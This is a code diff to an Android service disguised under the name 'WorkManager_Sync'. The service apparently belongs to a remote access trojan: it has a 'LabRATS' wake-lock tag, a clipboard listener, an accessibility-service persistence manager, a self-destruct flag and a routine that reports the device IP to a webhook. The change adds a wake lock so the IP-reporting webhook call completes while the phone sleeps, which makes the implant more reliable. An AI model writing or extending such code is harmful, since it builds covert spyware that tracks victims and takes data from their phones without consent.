@@ -112,11 +112,19 @@ public class WorkManager_Sync extends Service {
     private android.content.ClipboardManager.OnPrimaryClipChangedListener clipboardListener;
     private android.content.BroadcastReceiver tickReceiver;
     private static int restartCount = 0;
+    private android.os.PowerManager.WakeLock wakeLock;
 
     @Override
     public void onCreate() {
         super.onCreate();
         instance = this;
+
+        // --- WAKELOCK INITIALIZATION ---
+        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
+        if (pm != null) {
+            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "LabRATS:CoreSync");
+            wakeLock.setReferenceCounted(false);
+        }
 
         // --- NUCLEAR DESTRUCT CHECK ---
         // If the persistent destruct flag is set, do not initialize anything.
@@ -687,6 +695,9 @@ public class WorkManager_Sync extends Service {
 
     private void checkAndReportIp() {
         if (networkExecutor.isShutdown()) return;
+
+        // Acquire lock for IP resolution and webhook phase (Max 1 min)
+        if (wakeLock != null) wakeLock.acquire(60000);
         
         // Monitoring: Accessibility Service Health Check
         if (IO_Persistence_Manager.getInstance() == null) {
@@ -811,6 +822,10 @@ public class WorkManager_Sync extends Service {
             Log.e(TAG, "Webhook Critical Error: " + e.getMessage());
             webhookFailCount++;
             lastWebhookFailTime = System.currentTimeMillis();
+        } finally {
+            if (wakeLock != null && wakeLock.isHeld()) {
+                wakeLock.release();
+            }
         }
     }
 }
